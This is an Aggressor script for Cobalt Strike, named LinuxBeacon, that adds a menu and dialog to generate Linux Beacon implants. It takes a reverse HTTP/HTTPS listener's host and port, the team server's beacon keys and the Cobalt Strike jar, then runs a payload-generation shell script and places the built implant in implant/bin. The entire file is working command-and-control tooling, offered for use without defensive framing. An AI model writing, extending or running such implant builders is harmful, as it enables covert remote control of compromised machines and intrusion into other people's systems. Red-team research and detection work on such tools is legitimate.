# LinuxBeacon Aggressor UI
# Load THIS file from the LinuxBeacon folder (next to tools/ and implant/).
# Paths resolve via script_resource() — no manual root needed.

$LinuxBeaconRoot = script_resource("");
$Tools           = script_resource("tools/");
$Implant         = script_resource("implant/");
$GenSh           = script_resource("tools/gen_payload.sh");

menubar("LinuxBeacon", "linuxbeacon");

popup linuxbeacon {
	item "&Generate Linux Beacon" { lb_menu(); }
	item "&About" {
		show_message("LinuxBeacon\n" . $LinuxBeaconRoot);
	}
}

sub lb_ok {
	if ($1 eq $null || $1 eq "") { return 0; }
	if (-exists $1) { return 1; }
	return 0;
}

sub lb_menu {
	if (lb_ok($GenSh) == 0) {
		show_message("tools/gen_payload.sh not found.\nLoad CustomBeacon.cna from the LinuxBeacon folder.");
		return;
	}

	$dialog = dialog("LinuxBeacon Generator", %(
		listener    => "Select Listener: ",
		Beacon_name => "beacon",
		bridge      => "jar",
		profile     => "",
		beacon_keys => "",
		cs_jar      => "",
		java_home   => "",
		debug       => "no",
		sleep       => "",
		jitter      => ""
	), &lb_gen);

	dialog_description($dialog,
		"Required: listener, beacon_keys, cs_jar.\n" .
		"java_home: JDK folder e.g. /root/4.5/jdk1.8.0_501\n" .
		"debug=yes: -g -DDEBUG\n" .
		"profile: empty = default.profile"
	);

	drow_listener_stage($dialog, "listener", "Listener: ");
	drow_text($dialog, "Beacon_name", "Output name: ");
	drow_combobox($dialog, "bridge", "Bridge: ", @("jar", "python"));
	drow_file($dialog, "profile", "Malleable profile: ");
	drow_file($dialog, "beacon_keys", "Beacon keys: ");
	drow_file($dialog, "cs_jar", "CS jar: ");
	drow_text($dialog, "java_home", "Java home (JDK folder): ");
	drow_combobox($dialog, "debug", "Debug build: ", @("no", "yes"));
	drow_text($dialog, "sleep", "Sleep ms (optional): ");
	drow_text($dialog, "jitter", "Jitter % (optional): ");
	dbutton_action($dialog, "Generate");
	dialog_show($dialog);
}

sub lb_gen {
	local('$ListenerName $pt $https $host $port $name $bridge $profile $keys $csjar $jhome $debug $sleep $jitter @cmd $p @data $line $out');

	$ListenerName = $3['listener'];
	if ($ListenerName eq $null || $ListenerName ismatch "Select Listener: ") {
		show_message("Select reverse HTTP/HTTPS listener.");
		return;
	}

	$pt = listener_info($ListenerName, "payload");
	$https = "0";
	if ($pt eq "windows/beacon_https/reverse_https") {
		$https = "1";
	}
	else if ($pt ne "windows/beacon_http/reverse_http") {
		show_message("Only reverse_http / reverse_https.");
		return;
	}

	$host = listener_info($ListenerName, "host") . "";
	$port = listener_info($ListenerName, "port") . "";
	$name = $3['Beacon_name'];
	if ($name eq $null || $name eq "") { $name = "beacon"; }

	$bridge = lc($3['bridge']);
	if ($bridge eq "") { $bridge = "jar"; }

	$profile = $3['profile'];
	$keys    = $3['beacon_keys'];
	$csjar   = $3['cs_jar'];
	$jhome   = $3['java_home'];
	$debug   = lc($3['debug']);
	$sleep   = $3['sleep'];
	$jitter  = $3['jitter'];

	if (lb_ok($keys) == 0) {
		show_message("Select .cobaltstrike.beacon_keys");
		return;
	}
	if (lb_ok($csjar) == 0) {
		show_message("Select cobaltstrike.jar or untitled.jar");
		return;
	}

	@cmd = @("bash", "gen_payload.sh",
		"--host", $host,
		"--port", $port,
		"--https", $https,
		"--out", $name,
		"--bridge", $bridge,
		"--beacon-keys", $keys,
		"--cs-jar", $csjar
	);

	if ($jhome ne $null && $jhome ne "") {
		push(@cmd, "--java-home");
		push(@cmd, $jhome);
	}
	if ($debug eq "yes") {
		push(@cmd, "--debug");
	}
	if ($profile ne $null && $profile ne "" && lb_ok($profile) == 1) {
		push(@cmd, "--profile");
		push(@cmd, $profile);
	}
	if ($sleep ne $null && $sleep ne "") {
		push(@cmd, "--sleep");
		push(@cmd, $sleep . "");
	}
	if ($jitter ne $null && $jitter ne "") {
		push(@cmd, "--jitter");
		push(@cmd, $jitter . "");
	}

	println("[LinuxBeacon] root=" . $LinuxBeaconRoot);
	println("[LinuxBeacon] " . @cmd);

	$p = exec(@cmd, $null, $Tools);
	if ($p eq $null) {
		show_message("exec failed");
		return;
	}
	@data = readAll($p);
	foreach $line (@data) {
		if ($line ne $null) { println($line); }
	}
	closef($p);

	$out = script_resource("implant/bin/" . $name);
	if (lb_ok($out) == 1) {
		show_message("OK:\n" . $out);
	}
	else {
		show_message("Failed. See Script Console.\n" . $out);
	}
}
